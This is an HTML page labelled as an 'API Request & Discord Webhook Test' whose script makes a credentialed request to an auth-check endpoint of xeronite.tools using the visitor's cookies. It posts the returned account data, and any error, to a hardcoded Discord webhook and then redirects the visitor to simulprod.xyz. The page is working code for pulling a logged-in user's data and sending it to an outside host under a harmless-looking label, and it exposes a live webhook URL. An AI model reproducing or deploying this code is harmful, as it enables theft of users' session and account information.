<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>API Request Processing</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #fff;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        
        h1 {
            text-align: center;
            margin-top: 0;
            font-weight: 300;
        }
        
        .status {
            margin: 30px 0;
        }
        
        .step {
            display: flex;
            align-items: center;
            margin: 15px 0;
            padding: 15px;
            border-radius: 8px;
            transition: all 0.3s ease;
            background: rgba(0, 0, 0, 0.2);
        }
        
        .step.active {
            background: rgba(0, 123, 255, 0.2);
            border-left: 4px solid #007bff;
        }
        
        .step.completed {
            background: rgba(40, 167, 69, 0.2);
            border-left: 4px solid #28a745;
        }
        
        .step.error {
            background: rgba(220, 53, 69, 0.2);
            border-left: 4px solid #dc3545;
        }
        
        .step-icon {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            font-weight: bold;
        }
        
        .step.active .step-icon {
            background: #007bff;
        }
        
        .step.completed .step-icon {
            background: #28a745;
        }
        
        .step.error .step-icon {
            background: #dc3545;
        }
        
        .step.pending .step-icon {
            background: #6c757d;
        }
        
        .loader {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #007bff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .response-box {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            max-height: 200px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 12px;
            white-space: pre-wrap;
        }
        
        .button {
            background: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px 5px;
        }
        
        .button:hover {
            background: #0056b3;
        }
        
        .button:disabled {
            background: #6c757d;
            cursor: not-allowed;
        }
        
        .log {
            margin-top: 20px;
            padding: 15px;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 8px;
            max-height: 300px;
            overflow-y: auto;
        }
        
        .log-entry {
            padding: 5px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            font-size: 14px;
        }
        
        .log-time {
            color: #6c757d;
            margin-right: 10px;
        }
        
        .log-info {
            color: #17a2b8;
        }
        
        .log-success {
            color: #28a745;
        }
        
        .log-error {
            color: #dc3545;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>API Request & Discord Webhook Test</h1>
        
        <div style="text-align: center; margin-bottom: 20px;">
            <button class="button" id="startBtn">Start Process</button>
            <button class="button" id="manualRedirect" style="background: #28a745;">Redirect Now</button>
        </div>
        
        <div class="status">
            <div class="step pending" id="step1">
                <div class="step-icon">1</div>
                <div>
                    <div>Make API request to xeronite.tools</div>
                    <div style="font-size: 12px; opacity: 0.8;" id="step1-detail">Pending...</div>
                </div>
            </div>
            
            <div class="step pending" id="step2">
                <div class="step-icon">2</div>
                <div>
                    <div>Send response to Discord webhook</div>
                    <div style="font-size: 12px; opacity: 0.8;" id="step2-detail">Pending...</div>
                </div>
            </div>
            
            <div class="step pending" id="step3">
                <div class="step-icon">3</div>
                <div>
                    <div>Redirect to simulprod.xyz</div>
                    <div style="font-size: 12px; opacity: 0.8;" id="step3-detail">Pending...</div>
                </div>
            </div>
        </div>
        
        <div id="loader" class="loader" style="display: none;"></div>
        
        <div id="responseContainer" style="display: none;">
            <h3>API Response:</h3>
            <div class="response-box" id="responseContent"></div>
        </div>
        
        <div class="log">
            <h3>Process Log:</h3>
            <div id="logEntries"></div>
        </div>
    </div>

    <script>
        let processRunning = false;
        
        function logMessage(message, type = 'info') {
            const logEntries = document.getElementById('logEntries');
            const time = new Date().toLocaleTimeString();
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.innerHTML = `<span class="log-time">[${time}]</span> <span class="log-${type}">${message}</span>`;
            logEntries.appendChild(entry);
            logEntries.scrollTop = logEntries.scrollHeight;
        }
        
        function updateStep(stepId, status, detail = '') {
            const step = document.getElementById(stepId);
            const detailElement = document.getElementById(`${stepId}-detail`);
            
            step.classList.remove('pending', 'active', 'completed', 'error');
            step.classList.add(status);
            
            if (detail) {
                detailElement.textContent = detail;
            }
        }
        
        function redirectToSimulprod() {
            logMessage('Redirecting to simulprod.xyz...', 'info');
            updateStep('step3', 'completed', 'Redirecting now...');
            setTimeout(() => {
                window.location.href = "https://simulprod.xyz";
            }, 1000);
        }
        
        document.getElementById('startBtn').addEventListener('click', function() {
            if (processRunning) return;
            
            processRunning = true;
            this.disabled = true;
            document.getElementById('loader').style.display = 'block';
            document.getElementById('responseContainer').style.display = 'none';
            document.getElementById('logEntries').innerHTML = '';
            
            logMessage('Starting API request process...', 'info');
            
            // Step 1: Make API request
            updateStep('step1', 'active', 'Making request...');
            
            fetch("https://xeronite.tools/api/auth/check", {
                "headers": {
                    "accept": "*/*",
                    "accept-language": "en-US,en;q=0.9,vi;q=0.8,es;q=0.7,ru;q=0.6,id;q=0.5,zh-CN;q=0.4,zh;q=0.3,it;q=0.2,tr;q=0.1,ja;q=0.1,ko;q=0.1,nl;q=0.1,pt-BR;q=0.1,pt;q=0.1,fr;q=0.1,pl;q=0.1,da;q=0.1",
                    "cache-control": "no-cache",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Opera GX\";v=\"122\"",
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "\"Windows\"",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin"
                },
                "referrer": "https://xeronite.tools/profile",
                "body": null,
                "method": "GET",
                "mode": "cors",
                "credentials": "include"
            })
            .then(response => {
                logMessage(`API Response Status: ${response.status} ${response.statusText}`, 'info');
                
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                
                // Try to parse as JSON first, fall back to text if it fails
                const contentType = response.headers.get('content-type');
                if (contentType && contentType.includes('application/json')) {
                    return response.json().then(data => {
                        return { type: 'json', data: data };
                    });
                } else {
                    return response.text().then(text => {
                        return { type: 'text', data: text };
                    });
                }
            })
            .then(result => {
                logMessage('API request successful', 'success');
                updateStep('step1', 'completed', 'Request successful');
                
                // Display the response
                const responseContent = document.getElementById('responseContent');
                document.getElementById('responseContainer').style.display = 'block';
                
                if (result.type === 'json') {
                    responseContent.textContent = JSON.stringify(result.data, null, 2);
                } else {
                    responseContent.textContent = result.data || 'Empty response';
                }
                
                // Step 2: Send to Discord webhook
                updateStep('step2', 'active', 'Sending to Discord...');
                logMessage('Sending response to Discord webhook...', 'info');
                
                // Prepare the data to send to Discord
                const responseData = result.type === 'json' 
                    ? JSON.stringify(result.data, null, 2) 
                    : result.data;
                    
                const discordPayload = {
                    content: `API Response from xeronite.tools:\n\`\`\`${result.type === 'json' ? 'json' : 'text'}\n${responseData}\n\`\`\``,
                    username: "API Monitor",
                    avatar_url: "https://cdn-icons-png.flaticon.com/512/4712/4712035.png"
                };
                
                // Send to Discord webhook
                return fetch("https://discord.com/api/webhooks/1434566139270402260/7c5XHI2xwB0XUTINrL4yxoFFHtnJq2lZt3xRYqJuEQHakYXqH9As-hmXu1YUvBEI53Oj", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(discordPayload)
                });
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`Discord webhook error! status: ${response.status}`);
                }
                
                logMessage('Successfully sent to Discord webhook!', 'success');
                updateStep('step2', 'completed', 'Sent to Discord successfully');
                
                // Step 3: Redirect
                redirectToSimulprod();
            })
            .catch(error => {
                console.error("Error:", error);
                logMessage(`Error: ${error.message}`, 'error');
                
                if (error.message.includes('Discord')) {
                    updateStep('step2', 'error', `Failed: ${error.message}`);
                } else {
                    updateStep('step1', 'error', `Failed: ${error.message}`);
                }
                
                // Try to send error to Discord anyway
                const errorPayload = {
                    content: `Error in API process: ${error.message}`,
                    username: "API Monitor - Error",
                    avatar_url: "https://cdn-icons-png.flaticon.com/512/4712/4712035.png"
                };
                
                fetch("https://discord.com/api/webhooks/1434566139270402260/7c5XHI2xwB0XUTINrL4yxoFFHtnJq2lZt3xRYqJuEQHakYXqH9As-hmXu1YUvBEI53Oj", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(errorPayload)
                })
                .then(() => {
                    logMessage('Error details sent to Discord', 'info');
                })
                .catch(e => {
                    logMessage(`Failed to send error to Discord: ${e.message}`, 'error');
                })
                .finally(() => {
                    // Still redirect even if there was an error
                    setTimeout(() => {
                        redirectToSimulprod();
                    }, 2000);
                });
            })
            .finally(() => {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('startBtn').disabled = false;
                processRunning = false;
            });
        });
        
        document.getElementById('manualRedirect').addEventListener('click', function() {
            redirectToSimulprod();
        });
        
        // Log initial info
        logMessage('Page loaded. Click "Start Process" to begin.', 'info');
    </script>
</body>
</html>
